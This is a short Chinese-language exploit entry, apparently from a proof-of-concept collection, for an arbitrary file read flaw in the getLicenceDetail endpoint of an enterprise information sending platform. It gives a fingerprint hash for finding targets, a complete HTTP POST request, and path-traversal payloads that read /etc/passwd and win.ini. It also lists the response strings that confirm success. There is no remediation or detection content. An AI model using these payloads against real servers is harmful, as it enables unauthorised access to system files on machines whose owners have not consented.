# 企业信息发送平台getLicenceDetail存在任意文件读取漏洞

- **系统**：企业信息发送平台　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"G+ad9wy/zlkrmbSKJo9x+Q=="`
- **请求**：`POST /getLicenceDetail HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`X-Access-Token: undefined`　`X-Access-SessionId: undefined`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
fileName=../../../../../../etc/passwd
POST /getLicenceDetail HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
X-Access-Token: undefined
X-Access-SessionId: undefined
Content-Type: application/x-www-form-urlencoded
fileName=../../../../../../c:/windows/win.ini
```
- **预期**：200　|　root:或[Mail]